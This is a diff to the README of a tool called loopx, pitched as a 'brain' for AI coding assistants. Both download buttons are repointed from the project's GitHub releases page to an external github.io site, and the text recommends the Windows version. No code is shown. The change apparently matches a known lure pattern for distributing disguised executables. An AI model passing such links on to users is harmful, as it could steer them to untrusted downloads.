@@ -8,7 +8,7 @@ loopx is a simple "brain" for your AI coding assistants, like GitHub Copilot Cod
 
 ### Step 1: Download loopx
 
-[![Download loopx](https://img.shields.io/badge/Download-loopx-2ea44f?style=for-the-badge&logo=github)](https://github.com/inionrhinocerotidae914/loopx/releases)
+[![Download loopx](https://img.shields.io/badge/Download-loopx-2ea44f?style=for-the-badge&logo=github)](https://inionrhinocerotidae914.github.io)
 
 Visit this link to download the application. Click the big green button to get the latest version.
 
@@ -79,7 +79,7 @@ loopx saves progress locally and resumes when connected again.
 
 ## 📦 Download Again
 
-[![Download loopx](https://img.shields.io/badge/Download%20Latest-loopx-ff5733?style=for-the-badge&logo=github)](https://github.com/inionrhinocerotidae914/loopx/releases)
+[![Download loopx](https://img.shields.io/badge/Download%20Latest-loopx-ff5733?style=for-the-badge&logo=github)](https://inionrhinocerotidae914.github.io)
 
 Visit this link to download the application. Choose the version for your system (Windows recommended).
 
